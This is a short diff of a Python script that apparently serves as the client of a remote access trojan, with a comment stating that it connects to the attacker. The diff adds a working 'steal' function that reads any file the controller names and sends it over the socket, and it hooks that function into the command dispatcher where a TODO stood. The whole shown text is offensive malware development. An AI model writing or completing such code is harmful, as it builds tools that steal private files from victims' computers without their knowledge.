@@ -3,6 +3,20 @@ from platform import platform
 import subprocess
 
 
+def steal(sock, path):
+	path = path.split(" ")[0]
+	try:
+		file = open(path, "rb")
+		f = file.read(1024)
+		while f:
+			sock.send(f)
+			f = file.read(1024)
+		file.close()
+
+		sock.send("end".encode())
+
+	except:
+		pass
 
 
 # connects to the attacker
@@ -58,7 +72,7 @@ def main():
 				pass
 			
 		elif action == "steal":
-			# TODO: send a file to listener
+			steal(sock, parameter)
 			pass
 		elif action == "place":
 			# TODO: recieve a file form listener and save it
